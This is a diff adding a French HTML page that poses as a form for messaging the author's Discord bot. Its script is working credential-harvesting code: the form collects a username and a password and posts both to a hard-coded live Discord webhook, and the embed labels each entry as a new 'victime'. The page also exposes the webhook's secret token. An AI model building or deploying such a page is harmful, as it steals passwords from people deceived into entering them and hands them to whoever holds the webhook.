@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Envoi vers Discord</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #2c2f33;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 300px;
+      border-radius: 8px;
+      border: none;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #5865F2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #4752C4;
+    }
+  </style>
+</head>
+<body>
+  <h2>💬 Envoie un message à mon bot ps: LES CHATS C'EST LES MEILLEURS</h2>
+  <input type="text" id="pseudo" placeholder="Ton pseudo...">
+  <input type="text" id="message" placeholder="Ton mot de passe...">
+  <button id="sendBtn">Entrer</button>
+
+  <script>
+    // ⚠️ Mets ton lien de webhook Discord ici :
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1430155105952600125/miSVSRG79JmwJUBifFY8ejhEFtI2mwEVZ3Wd9ix69nUob0LUVFJyrFbVzDGqowbyEYbC";
+
+    document.getElementById("sendBtn").addEventListener("click", async () => {
+      const pseudo = document.getElementById("pseudo").value.trim();
+      const message = document.getElementById("message").value.trim();
+
+      if (!pseudo || !message) {
+        alert("Merci de remplir ton pseudo et ton message !");
+        return;
+      }
+
+      const payload = {
+        embeds: [
+          {
+            title: "📩 Nouvelle victime BAHAHHAHA reçu",
+            color: 0x5865f2,
+            fields: [
+              { name: "👤 Pseudo", value: pseudo, inline: true },
+              { name: "🔒 Mot de passe", value: message, inline: false }
+            ],
+            footer: { text: "Message envoyé depuis ton site 💻" }
+          }
+        ]
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      alert("Message envoyé sur Discord !");
+      document.getElementById("pseudo").value = "";
+      document.getElementById("message").value = "";
+    });
+  </script>
+</body>
+</html>
